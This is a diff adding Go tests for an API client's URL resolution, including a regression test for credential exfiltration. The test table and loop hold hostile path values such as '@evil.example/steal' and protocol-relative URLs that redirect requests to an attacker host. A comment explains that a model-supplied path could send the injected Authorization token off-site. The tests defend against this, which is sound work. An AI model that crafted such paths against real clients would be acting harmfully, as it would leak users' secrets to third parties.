@@ -493,3 +493,95 @@ func TestDo_TokenAuthFailure(t *testing.T) {
 		t.Fatalf("expected 'token invalid' error, got: %v", err)
 	}
 }
+
+// --- request URL construction ---
+
+func TestResolveURL(t *testing.T) {
+	c := New("github", "https://api.github.com", nil, integration.Deps{})
+
+	tests := []struct {
+		name    string
+		path    string
+		want    string
+		wantErr bool
+	}{
+		{"absolute path", "/user", "https://api.github.com/user", false},
+		{"path with query", "/repos/o/r/issues?state=open", "https://api.github.com/repos/o/r/issues?state=open", false},
+		{"path without leading slash", "user", "https://api.github.com/user", false},
+		{"encoded segment is preserved", "/repos/o/r/contents/a%2Fb", "https://api.github.com/repos/o/r/contents/a%2Fb", false},
+
+		// The userinfo trick: appended to the base URL as a string, this
+		// reparses as host evil.example with api.github.com demoted to
+		// userinfo, sending the injected Authorization header off-site.
+		{"userinfo host takeover", "@evil.example/steal", "https://api.github.com/@evil.example/steal", false},
+		{"userinfo host takeover with query", "@evil.example/steal?x=1", "https://api.github.com/@evil.example/steal?x=1", false},
+
+		{"protocol-relative URL", "//evil.example/steal", "", true},
+		{"absolute URL", "https://evil.example/steal", "", true},
+		{"absolute URL same scheme", "http://evil.example/steal", "", true},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got, err := c.resolveURL(tt.path)
+			if tt.wantErr {
+				if err == nil {
+					t.Fatalf("resolveURL(%q) = %q, want error", tt.path, got)
+				}
+				return
+			}
+			if err != nil {
+				t.Fatalf("resolveURL(%q): %v", tt.path, err)
+			}
+			if got != tt.want {
+				t.Errorf("resolveURL(%q) = %q, want %q", tt.path, got, tt.want)
+			}
+		})
+	}
+}
+
+// TestDo_NeverLeavesBaseHost is the regression test for credential
+// exfiltration: Do built its URL by concatenation, so a model-supplied path
+// could retarget the request at an attacker's host while apiclient still
+// injected the real Authorization header.
+func TestDo_NeverLeavesBaseHost(t *testing.T) {
+	var attackerGotAuth string
+	attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		attackerGotAuth = r.Header.Get("Authorization")
+		w.WriteHeader(200)
+	}))
+	defer attacker.Close()
+
+	attackerHost := strings.TrimPrefix(attacker.URL, "http://")
+
+	var upstreamHits int
+	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		upstreamHits++
+		w.WriteHeader(200)
+		_, _ = w.Write([]byte(`{}`))
+	}))
+	defer upstream.Close()
+
+	deps, _ := testDeps(map[string]string{"TOKEN": "sk-super-secret"})
+	mappings := []integration.SecretMapping{{
+		SecretName: "TOKEN",
+		HeaderName: "Authorization",
+		HeaderTmpl: "Bearer %s",
+	}}
+	c := New("test", upstream.URL, mappings, deps)
+
+	for _, path := range []string{
+		"@" + attackerHost + "/steal",
+		"//" + attackerHost + "/steal",
+		"http://" + attackerHost + "/steal",
+	} {
+		t.Run(path, func(t *testing.T) {
+			attackerGotAuth = ""
+			_, _, _ = c.Do(context.Background(), "GET", path, nil, nil)
+
+			if attackerGotAuth != "" {
+				t.Fatalf("secret leaked to attacker host: Authorization = %q", attackerGotAuth)
+			}
+		})
+	}
+}
